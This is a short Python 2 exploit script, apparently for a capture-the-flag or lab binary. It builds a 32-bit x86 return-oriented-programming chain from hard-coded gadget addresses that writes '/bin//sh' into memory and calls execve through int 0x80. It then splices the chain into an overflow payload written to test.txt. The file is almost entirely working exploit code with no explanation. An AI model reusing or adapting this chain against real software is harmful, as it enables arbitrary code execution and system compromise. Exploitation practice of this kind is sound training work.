import struct
def main():
	data = ""
	gad = struct.pack("<L",0x8048f50)
	with open("p2.txt","rb") as fp:
		data = fp.read(417)
	print data.lstrip("\n")
	from struct import pack

	# Padding goes here
	p = ''

	p += pack('<I', 0x080594aa) # pop edx ; ret
	p += pack('<I', 0x080ee060) # @ .data
	p += pack('<I', 0x080c1f06) # pop eax ; ret
	p += '/bin'
	p += pack('<I', 0x0808e67d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x080594aa) # pop edx ; ret
	p += pack('<I', 0x080ee064) # @ .data + 4
	p += pack('<I', 0x080c1f06) # pop eax ; ret
	p += '//sh'
	p += pack('<I', 0x0808e67d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x080594aa) # pop edx ; ret
	p += pack('<I', 0x080ee068) # @ .data + 8
	p += pack('<I', 0x0804af00) # xor eax, eax ; ret
	p += pack('<I', 0x0808e67d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x080481ec) # pop ebx ; ret
	p += pack('<I', 0x080ee060) # @ .data
	p += pack('<I', 0x080e3fa2) # pop ecx ; ret
	p += pack('<I', 0x080ee068) # @ .data + 8
	p += pack('<I', 0x080594aa) # pop edx ; ret
	p += pack('<I', 0x080ee068) # @ .data + 8
	p += pack('<I', 0x0804af00) # xor eax, eax ; ret
	p += pack('<I', 0x0809a17f) # inc eax ; ret
	p += pack('<I', 0x0809a17f) # inc eax ; ret
	p += pack('<I', 0x0809a17f) # inc eax ; ret
	p += pack('<I', 0x0809a17f) # inc eax ; ret
	p += pack('<I', 0x0809a17f) # inc eax ; ret
	p += pack('<I', 0x0809a17f) # inc eax ; ret
	p += pack('<I', 0x0809a17f) # inc eax ; ret
	p += pack('<I', 0x0809a17f) # inc eax ; ret
	p += pack('<I', 0x0809a17f) # inc eax ; ret
	p += pack('<I', 0x0809a17f) # inc eax ; ret
	p += pack('<I', 0x0809a17f) # inc eax ; ret
	p += pack('<I', 0x080494f9) # int 0x80
	payload = data[0:260]+gad+p+data[264:285]+gad+"C"*4+"D"*4+"E"*4+data[264:]
	with open("test.txt","wb") as fp:
		fp.write(payload)
	pass
main()
